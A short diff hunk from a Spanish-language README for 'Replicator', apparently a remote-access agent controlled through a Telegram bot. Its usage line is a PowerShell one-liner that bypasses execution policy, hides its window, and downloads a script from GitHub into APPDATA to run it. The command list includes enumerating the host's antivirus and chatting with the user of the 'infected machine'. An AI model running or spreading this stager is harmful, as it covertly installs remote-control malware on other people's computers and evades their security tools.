@@ -7,7 +7,7 @@ Requiere crear un bot de Telegram. Con esto obtienes un API_TOKEN y un CHAT_ID.
 # Uso
 powershell -EP Bypass -WindowStyle hidden "(iwr 'https://raw.githubusercontent.com/josprou/Replicator/main/Replicator.ps1').content > $env:APPDATA\aaa.ps1 ; & $env:APPDATA\aaa.ps1 'API_TOKEN' 'CHAT_ID'"
 
-# Comandos
+# Comandos / Módulos
 - avs: enumera los antivirus del host
 - bar: sirve para calibrar el agente
 - chat: inicia un chat con el usuario del equipo infectado
